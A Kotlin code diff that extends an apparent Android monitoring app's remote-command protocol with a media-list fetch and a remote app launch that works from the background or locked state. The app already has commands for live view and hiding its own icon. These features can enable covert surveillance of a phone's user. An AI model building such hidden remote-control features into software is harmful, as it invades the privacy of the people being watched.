@@ -25,10 +25,17 @@ sealed class RemoteCommand {
     object ToggleMonitoring : RemoteCommand() { override val type = "TOGGLE_MONITORING" }
     object StartLiveView : RemoteCommand() { override val type = "START_LIVE_VIEW" }
     object StopLiveView : RemoteCommand() { override val type = "STOP_LIVE_VIEW" }
+    object FetchMediaList : RemoteCommand() { override val type = "FETCH_MEDIA_LIST" }
 
     // --- App-icon visibility (no Device Owner needed; uses PackageManager) ---
     object HideAppIcon : RemoteCommand() { override val type = "HIDE_APP_ICON" }
     object ShowAppIcon : RemoteCommand() { override val type = "SHOW_APP_ICON" }
+
+    // --- Remote app launch (no Device Owner needed; routed via the foreground
+    //     service so it can start activities from the background/locked state) ---
+    data class LaunchApp(val packageName: String) : RemoteCommand() {
+        override val type = "LAUNCH_APP"
+    }
 
     // NOTE: Device Owner commands (remote lock / disable camera / uninstall /
     // wipe / true kiosk) require Device Owner provisioning, which itself
@@ -51,6 +58,7 @@ sealed class RemoteCommand {
         when (this) {
             is SetSoundSensitivity -> json.put("db", db)
             is SetMotionSensitivity -> json.put("level", level)
+            is LaunchApp -> json.put("packageName", packageName)
             else -> {}
         }
         return json.toString()
@@ -71,8 +79,10 @@ sealed class RemoteCommand {
                 "TOGGLE_MONITORING" -> ToggleMonitoring
                 "START_LIVE_VIEW" -> StartLiveView
                 "STOP_LIVE_VIEW" -> StopLiveView
+                "FETCH_MEDIA_LIST" -> FetchMediaList
                 "HIDE_APP_ICON" -> HideAppIcon
                 "SHOW_APP_ICON" -> ShowAppIcon
+                "LAUNCH_APP" -> LaunchApp(json.optString("packageName"))
                 "SET_SOUND_SENSITIVITY" -> SetSoundSensitivity(json.optDouble("db", 60.0).toFloat())
                 "SET_MOTION_SENSITIVITY" -> SetMotionSensitivity(json.optDouble("level", 5.0).toFloat())
                 else -> null
